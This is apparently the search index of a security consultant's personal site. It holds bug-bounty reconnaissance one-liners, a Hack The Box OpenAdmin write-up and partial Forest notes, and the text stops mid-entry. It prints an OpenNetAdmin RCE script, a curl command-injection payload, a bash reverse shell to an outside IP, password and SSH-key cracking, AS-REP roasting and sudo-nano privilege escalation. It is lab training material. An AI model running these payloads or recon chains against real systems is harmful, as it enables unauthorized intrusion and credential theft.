{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home \ud83c\udfe0","text":""},{"location":"#about-me","title":"About me","text":"<p>As a security consultan, I apply my extensive knowledge and experience in DevSecOps and cloud security to help clients enhance their security posture and resilience. With over 3 years of experience in cybersecurity, I have developed a keen eye for detecting and resolving vulnerabilities, conducting risk assessments, and implementing security measures to mitigate potential threats.</p> <p>I am passionate about staying on top of the latest trends and technologies in the industry, ensuring that I can provide effective and up-to-date solutions. I am also an avid learner and a proud CTF player Hackthebox, who enjoys participating in cybersecurity events, conferences, and online forums. I value collaboration and knowledge sharing, and I strive to empower and support my colleagues and peers in their cybersecurity journey</p>"},{"location":"#blogs","title":"Blogs","text":"<ul> <li>https://y3rb1t4.com.ar</li> </ul>"},{"location":"#find-me-on","title":"Find me on","text":"<ul> <li>LinkedIn</li> <li>GitHub</li> <li>Links</li> </ul>"},{"location":"BugBounty/","title":"BugBounty","text":"<p>Coming Soon!</p>"},{"location":"BugBounty/Reconassiance/","title":"Reconassiance","text":"<p>./## Subdomain Discovery</p> <pre><code>amass enum -brute -active -d example.com -o amass-output.txt\namass enum -active -d example.com | httpx -sc -td -title -silent -o httpx.txt\ncat httpx.txt | sed 's/http:\\/\\/\\|https:\\/\\/\\|ftp:\\/\\///g'\n</code></pre> <pre><code>subfinder -silent -all -d example.com | httpx -silent -sc\nsubfinder -silent -all -d example.com | httpx | nuclei -s critical,high,medium,low,info\n</code></pre> <pre><code>./sublist3r.py -d example.com | httpx -silent -sc\n</code></pre>"},{"location":"BugBounty/Reconassiance/#directory-bruteforce","title":"Directory Bruteforce","text":"<pre><code>dirsearch.py -e php -u https://example.com --exclude-status 403,401\ndirsearch.py -l taerget.txt --deep-recursive\ndirsearch --tor --crawl -u https://example.com --exclude-status 404 --deep-recursive --max-rate=5 -q --format=xml\n</code></pre>"},{"location":"BugBounty/Reconassiance/#parameter-discovery-batman-matching","title":"Parameter Discovery &amp; Batman Matching","text":"<pre><code>paramspider -l domains.txt -p batman\n\ncat results/* | while read line; do echo \"$line\" &gt;&gt; params.txt; done\n\ncat params.txt | while read line; do curl -X GET -s \"$line\" | grep -oq batman &amp;&amp; echo \"$line\"; done\n</code></pre>"},{"location":"BugBounty/Reconassiance/#get-directories-parameters","title":"Get directories + parameters","text":"<pre><code>cat domains.txt | gau --o urls.txt\n</code></pre>"},{"location":"BugBounty/Reconassiance/#get-directories-reflected-chars","title":"Get directories + Reflected chars","text":"<pre><code>cat domains.txt | gau | grep \"=\" | kxss\ncat domains.txt | gau --subs | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | kxss\ncat domains.txt | gau | gf xss | dalfox pipe\ncat alive_urls.txt | grep \"=\" | dalfox pipe --waf-evasion --timeout 10\n</code></pre>"},{"location":"BugBounty/Reconassiance/#get-javascript-files","title":"Get Javascript Files","text":"<pre><code>cat domains.txt | gau | subjs\n</code></pre>"},{"location":"BugBounty/Reconassiance/#find-endpoints-in-js-files","title":"Find endpoints in JS Files","text":"<pre><code>python3 linkfinder.py -i https://example.com \n</code></pre>"},{"location":"BugBounty/Reconassiance/#nuclei","title":"Nuclei","text":"<pre><code>nuclei -u https://example.com -s critical,high,medium,low,info\n</code></pre> <p>Chained with Paramspider &amp; HTTPX </p> <pre><code>paramspider -d example.com --exclude png,jpg,gif,jpeg,swf,woff,gif,svg --level high --quiet -o paramfuzzer.txt\n\ncat paramfuzzer.txt | httpx -silent -mc 200,301,302,403 | nuclei -t /home/bara/bugbounty/tools/fuzzing-templates -rl 05\n</code></pre> <p>Chained with Katana &amp; HTTPX</p> <pre><code>katana -list domainsurls.txt -silent -d 6 -rl 25 -jc qurl | httpx -silent -mc 200,301,302,403 | nuclei -t /home/bara/bugbounty/tools/fuzzing-templates/xss/reflected-xss.yaml -rl 25 \n</code></pre>"},{"location":"BugBounty/Reconassiance/#automated","title":"Automated","text":"<pre><code>osmedeus scan -t fanbox.cc\n</code></pre> <pre><code>nikto -h example.com -ssl\n</code></pre> <p>Probando</p>"},{"location":"BugBounty/Oneliner2/Oneliner2/","title":"OneLiner2 \ud83e\uddc9","text":""},{"location":"CTF/","title":"Capture The Flag","text":"<p>Coming Soon!</p>"},{"location":"CTF/HackTheBox/","title":"Hack The Box","text":"<p>Coming Soon!</p>"},{"location":"CTF/HackTheBox/Recon/","title":"Nmap","text":""},{"location":"CTF/HackTheBox/machines/","title":"Machines","text":"<p>Coming Soon!</p>"},{"location":"CTF/HackTheBox/machines/easy/","title":"Easy","text":"<p>Coming Soon!</p>"},{"location":"CTF/HackTheBox/machines/easy/openadmin/","title":"OpenAdmin","text":"<p>OpenAdmin is an easy difficulty Linux machine that features an outdated OpenNetAdmin CMS instance. The CMS is exploited to gain a foothold, and subsequent enumeration reveals database credentials. These credentials are reused to move laterally to a low privileged user. This user is found to have access to a restricted internal application. Examination of this application reveals credentials that are used to move laterally to a second user. A sudo misconfiguration is then exploited to gain a root shell.</p>","tags":["fuzzing","ssh","john","sudo","gtfobins","opennetadmin"]},{"location":"CTF/HackTheBox/machines/easy/openadmin/#nmap","title":"Nmap","text":"<p>As usual, we first run nmap scan and get http on port 80 and ssh on port 22.</p> <pre><code>\u276f nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.136.167\n\n22/ssh\n80/http\n\n\u276f nmap -p22,80 -sCV 10.129.136.167\n\nPORT  STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)\n|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)\n|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-title: Apache2 Ubuntu Default Page: It works\n|_http-server-header: Apache/2.4.29 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <p>We scan the host with gobuster to enumerate hidden directories.</p> <pre><code>\u276f gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.136.167/ -t 20\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://10.129.136.167/\n[+] Method:                  GET\n[+] Threads:                 20\n[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/music                (Status: 301) [Size: 316] [--&gt; http://10.129.136.167/music/]\n</code></pre> <p>And we got a hit, <code>/music</code>. Let's see what's in there</p> <p></p> <p>Nothing interesting at first, but when we try to login it redirects us to OpenNetAdmin. </p> <p></p> <p>The version that is shown is old. Looking for public exploits, we find that it is vulnerable to Remote Code Execution.</p> <pre><code>\u276f searchsploit OpenNetAdmin\n-------------------------------------------------------- ---------------------------------\n Exploit Title                                          |  Path\n-------------------------------------------------------- ---------------------------------\nOpenNetAdmin 13.03.01 - Remote Code Execution           | php/webapps/26682.txt\nOpenNetAdmin 18.1.1 - Command Injection Exploit (Metasp | php/webapps/47772.rb\nOpenNetAdmin 18.1.1 - Remote Code Execution             | php/webapps/47691.sh\n-------------------------------------------------------- ---------------------------------\n\n\u276f searchsploit -x php/webapps/47691.sh\n</code></pre> <pre><code>#!/bin/bash\n\nURL=\"${1}\"\nwhile true;do\n echo -n \"$ \"; read cmd\n curl --silent -d \"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \\\"BEGIN\\\";${cmd};echo \\\"END\\\"&amp;xajaxargs[]=ping\" \"${URL}\" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1\ndone\n</code></pre> <p>The script looks easy to repy, I'll first try to execute <code>ifconfig</code> and if it works, we then try a reverse shell.</p> <pre><code>\u276f curl -s -d \"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo;ifconfig&amp;xajaxargs[]=ping\" http://10.129.136.167/ona/\n</code></pre> <pre><code>  &lt;pre style=\"padding: 4px;font-family: monospace;\"&gt;\nens160: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500\n        inet 10.129.136.167  netmask 255.255.0.0  broadcast 10.129.255.255\n        inet6 dead:beef::250:56ff:feb0:be91  prefixlen 64  scopeid 0x0&lt;global&gt;\n        inet6 fe80::250:56ff:feb0:be91  prefixlen 64  scopeid 0x20&lt;link&gt;\n        ether 00:50:56:b0:be:91  txqueuelen 1000  (Ethernet)\n        RX packets 99282  bytes 6727143 (6.7 MB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 75094  bytes 6421308 (6.4 MB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\nlo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536\n        inet 127.0.0.1  netmask 255.0.0.0\n        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;\n        loop  txqueuelen 1000  (Local Loopback)\n        RX packets 11863  bytes 942899 (942.8 KB)\n        RX errors 0  dropped 0  overruns 0  frame 0\n        TX packets 11863  bytes 942899 (942.8 KB)\n        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n\n&lt;/pre&gt;\n</code></pre> <p>It worked! Let's set up a listener on port 80 with <code>netcat</code> to catch the reverse shell.</p> <pre><code>\u276f nc -lvnp 80\n</code></pre> <p>Payload used: <code>bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.178/80 0&gt;&amp;1</code> (URL encode the <code>&amp;</code>).</p> <pre><code>\u276f curl -s -d \"xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo;bash -c 'bash -i &gt;%26 /dev/tcp/10.10.14.178/80 0&gt;%261'&amp;xajaxargs[]=ping\" http://10.129.136.167/ona/\n</code></pre> <p>I'll threat my terminal so I could then do <code>CTRL + C</code> and it won't broke.</p> <pre><code>www-data@openadmin:/opt/ona/www$ script /dev/null -c bash\nscript /dev/null -c bash\nScript started, file is /dev/null\nwww-data@openadmin:/opt/ona/www$ ^Z\n\u276f stty raw -echo; fg\n[1]  + continued  ncat -lvnp 80\n                               reset xterm\n\nwww-data@openadmin:/opt/ona/www$ export TERM=xterm\nwww-data@openadmin:/opt/ona/www$ export SHELL=bash\n</code></pre> <p>Looking for interesting files in the folder we are, we see that there are so much places to look.</p> <pre><code>www-data@openadmin:/opt/ona/www$ ls\nconfig\nimages\nlocal\nmodules\nworkspace_plugins\nconfig_dnld.php\ninclude\nlogin.php\nplugins\ndcm.php\nindex.php\nlogout.php\nwinc\n</code></pre> <p>So, instead of going one by one, I'll just try to get a password doing the following.</p> <pre><code>www-data@openadmin:/opt/ona/www$ grep -ri pass\n\ndcm.php:// If no user name is passed in then use dcm.pl as the login name\ndcm.php:// be careful as this currently does not require a password.\nlocal/config/database_settings.inc.php:        'db_passwd' =&gt; 'n1nj4W4rri0R!',\nwinc/display_domain_server.inc.php:    // It expects to be passed the domain name as domain= to the module\nwinc/app_plugin_list.inc.php://     call is made to display_list(), this time passing a search\n</code></pre> <p>So we got a password <code>'db_passwd' =&gt; 'n1nj4W4rri0R!'</code></p> <pre><code>www-data@openadmin:/opt/ona/www$ cat /etc/passwd | grep 'sh$'\nroot:x:0:0:root:/root:/bin/bash\njimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash\njoanna:x:1001:1001:,,,:/home/joanna:/bin/bash\n</code></pre> <p>Let's try it with <code>joanna</code> and then with <code>jimmy</code></p> <pre><code>www-data@openadmin:/opt/ona/www$ su joanna \nPassword: n1nj4W4rri0R!\nsu: Authentication failure\nwww-data@openadmin:/opt/ona/www$ su jimmy \nPassword: n1nj4W4rri0R!\njimmy@openadmin:/opt/ona/www$ \n</code></pre> <p>Got it, doing some recon we find that port <code>52846</code> is running.</p> <pre><code>jimmy@openadmin:/opt/ona/www$ ss -nltp\nState    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port    \nLISTEN   0         128               127.0.0.1:52846            0.0.0.0:*       \nLISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*       \nLISTEN   0         128                 0.0.0.0:22               0.0.0.0:*       \nLISTEN   0         80                127.0.0.1:3306             0.0.0.0:*       \nLISTEN   0         128                       *:80                     *:*       \nLISTEN   0         128                    [::]:22                  [::]:*       \n</code></pre> <pre><code>jimmy@openadmin:/opt/ona/www$ ls /etc/apache2/sites-enabled/\ninternal.conf  openadmin.conf\n\njimmy@openadmin:/opt/ona/www$ cat /etc/apache2/sites-enabled/internal.conf \nListen 127.0.0.1:52846\n\n&lt;VirtualHost 127.0.0.1:52846&gt;\n    ServerName internal.openadmin.htb\n    DocumentRoot /var/www/internal\n\n&lt;IfModule mpm_itk_module&gt;\nAssignUserID joanna joanna\n&lt;/IfModule&gt;\n\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n&lt;/VirtualHost&gt;\n</code></pre> <p>And looking for another site in Apache, we find out that there is another one called <code>internal.conf</code>.</p> <pre><code>jimmy@openadmin:/var/www/internal$ ls\nindex.php  logout.php  main.php\n</code></pre> <p>Looking inside there is something interesting.</p> <pre><code>jimmy@openadmin:/var/www/internal$ cat main.php \n&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(\"Location: /index.php\"); }; \n# Open Admin Trusted\n# OpenAdmin\n$output = shell_exec('cat /home/joanna/.ssh/id_rsa');\necho \"&lt;pre&gt;$output&lt;/pre&gt;\";\n?&gt;\n&lt;html&gt;\n&lt;h3&gt;Don't forget your \"ninja\" password&lt;/h3&gt;\nClick here to logout &lt;a href=\"logout.php\" tite = \"Logout\"&gt;Session\n&lt;/html&gt;\n</code></pre> <p><code>$output = shell_exec('cat /home/joanna/.ssh/id_rsa');</code> That will be executed if we just do a <code>curl</code> to it.</p> <pre><code>jimmy@openadmin:/var/www/internal$ curl 127.0.0.1:52846/main.php\n&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D\n\nkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8\nad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO\nShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE\n6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ\nZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du\ny8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI\n9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4\npiC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/\n/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH\n40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ\nfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\nX1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\nS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\nFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\nTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\nRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\nuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\nXGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\nyPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\nqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\nz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\nK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n-----END RSA PRIVATE KEY-----\n&lt;/pre&gt;&lt;html&gt;\n&lt;h3&gt;Don't forget your \"ninja\" password&lt;/h3&gt;\nClick here to logout &lt;a href=\"logout.php\" tite = \"Logout\"&gt;Session\n&lt;/html&gt;\n</code></pre> <p>And boom, we got Joannas <code>id_rsa</code>, but it's encrypted.</p> <pre><code>\u276f cat id_rsa_encrypt\n\n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D\n\nkG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8\nad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO\nShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE\n6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ\nZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du\ny8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI\n9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4\npiC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/\n/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH\n40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ\nfnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb\n9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80\nX1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg\nS33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F\nFnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh\nTh5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa\nRTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z\nuhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr\n1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2\nXGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79\nyPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM\n+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt\nqlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt\nz0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe\nK1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN\n-----END RSA PRIVATE KEY-----\n</code></pre> <p>Let's try to get the password using John The Ripper.</p> <pre><code>\u276f ssh2john id_rsa_encrypt &gt; hash\n\u276f cat hash\n\nid_rsa_encrypt:$sshng$1$16$2AF25344B8391A25A9B318F3FD767D6D$1200$906d14608706c9ac6ea6342a692d9ed47a9b87044b94d72d5b6[SNIP]\n</code></pre> <pre><code>\u276f john --wordlist=/usr/share/wordlists/rockyou.txt hash\nbloodninjas\n</code></pre> <p><code>bloodninjas</code> is the password for the <code>id_rsa</code>, we can now log in as <code>joanna</code> using it.</p> <pre><code>\u276f ssh joanna@10.129.136.167 -i id_rsa_encrypt\nEnter passphrase for key 'id_rsa_encrypt': bloodninjas\njoanna@openadmin:~$ cat user.txt \n8343c1907e5be96627ebce7b19ceba64\n</code></pre> <p>Looking for privileges, we can run <code>nano</code> as sudo.</p> <pre><code>joanna@openadmin:~$ sudo -l\nMatching Defaults entries for joanna on openadmin:\n    env_keep+=\"LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET\", env_keep+=\"XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH\",\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, mail_badpass\n\nUser joanna may run the following commands on openadmin:\n    (ALL) NOPASSWD: /bin/nano /opt/priv\n</code></pre> <p>Easy privilege escalation, looking at GTFObins</p> <pre><code>joanna@openadmin:~$ sudo /bin/nano /opt/priv\nCTRL + r\nCTRL + x\nreset; sh 1&gt;&amp;0 2&gt;&amp;0\n</code></pre> <p></p> <pre><code>root@openadmin:/home/joanna# cat ~/root.txt\n2dac735cb9a245d1ca3c88970df6a5dc\n</code></pre> <p>We got the root flag.</p> <p>References - https://app.hackthebox.com/machines/OpenAdmin</p>","tags":["fuzzing","ssh","john","sudo","gtfobins","opennetadmin"]},{"location":"CTF/HackTheBox/machines-retired/Forest/","title":"Index","text":"<pre><code>GetNPUsers.py htb.local/ -no-pass -usersfile users.txt\nImpacket for Exegol - v0.10.1.dev1+20231106.134307.9aa9373 - Copyright 2022 Fortra - forked by ThePorgs\n\n[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:a3b605683623e28a805d9771f7989397$8c0e9b11eb16ad010fba33c641d13665ccff26498a71f8c7e964bab9bb726dbdd6cb71c8e91a27f23ba09b1a7b20e858cb9875cc620862ee562a505fd5ba39619b01d2eded2e57d09134664e8f7da756a3fa14a2f2096ace23097ec6a9e2712f3c4a176893587061e3344080ea206a084cfef24fd7f903b6f067c5db77123599b1ddab6d75487fe61ec971d73c5ecbd03f53e1ae0813a82f63f28fa0bcddeb569db4f55d36822056088513ad7e6dcafe4d087b6135e328a06d84809de98a347457911f09786344afaffd685d45d3836b7c0e4eaedd5957ffd1d4bfbae87e000daed89f2afe83\n[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set\n</code></pre> <pre><code>john --wordlist=`fzf-wordlists` hash\n\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])\nCost 1 (etype) is 23 for all loaded hashes\nWill run 16 OpenMP threads\nPress 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status\ns3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     \n1g 0:00:00:01 DONE (2024-04-03 23:01) 0g/s 2817Kp/s 2817Kc/s 2817KC/s s5213336..s3r1bu\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed. \n</code></pre> <pre><code>crackmapexec smb 10.129.252.217 -u 'svc-alfresco' -p 's3rvice'\nSMB         10.129.252.217  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)\nSMB         10.129.252.217  445    FOREST           [+] htb.local\\svc-alfresco:s3rvice \n</code></pre> <pre><code>crackmapexec smb 10.129.252.217 -u 'svc-alfresco' -p 's3rvice' --shares\nSMB         10.129.252.217  445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)\nSMB         10.129.252.217  445    FOREST           [+] htb.local\\svc-alfresco:s3rvice \nSMB         10.129.252.217  445    FOREST           [*] Enumerated shares\nSMB         10.129.252.217  445    FOREST           Share           Permissions     Remark\nSMB         10.129.252.217  445    FOREST           -----           -----------     ------\nSMB         10.129.252.217  445    FOREST           ADMIN$                          Remote Admin\nSMB         10.129.252.217  445    FOREST           C$                              Default share\nSMB         10.129.252.217  445    FOREST           IPC$                            Remote IPC\nSMB         10.129.252.217  445    FOREST           NETLOGON        READ            Logon server share \nSMB         10.129.252.217  445    FOREST           SYSVOL          READ            Logon server share\n</code></pre> <pre><code>crackmapexec winrm 10.129.252.217 -u 'svc-alfresco' -p 's3rvice'         \nSMB         10.129.252.217  5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)\nHTTP        10.129.252.217  5985   FOREST           [*] http://10.129.252.217:5985/wsman\nHTTP        10.129.252.217  5985   FOREST           [+] htb.local\\svc-alfresco:s3rvice (admin)\n</code></pre>"},{"location":"TheArtofHacking/","title":"The Art of Hacking","text":"<p>Coming Soon!</p>"},{"location":"Tutorials/WindowsPrivilegeEscalation/Windows%20ProiPr/","title":"Windows ProiPr","text":"<p>asdf</p>"},{"location":"Tutorials/active_directory/bloodhound/","title":"Comandos y Tips para BloodHound","text":""},{"location":"Tutorials/active_directory/methodology/","title":"Algunas metodologias de AD","text":""},{"location":"Tutorials/active_directory/methodology/#como-pasar-de-pentester-a-red-teamer-checklist-de-quickwins","title":"C\u00f3mo pasar de Pentester a Red Teamer: Checklist de 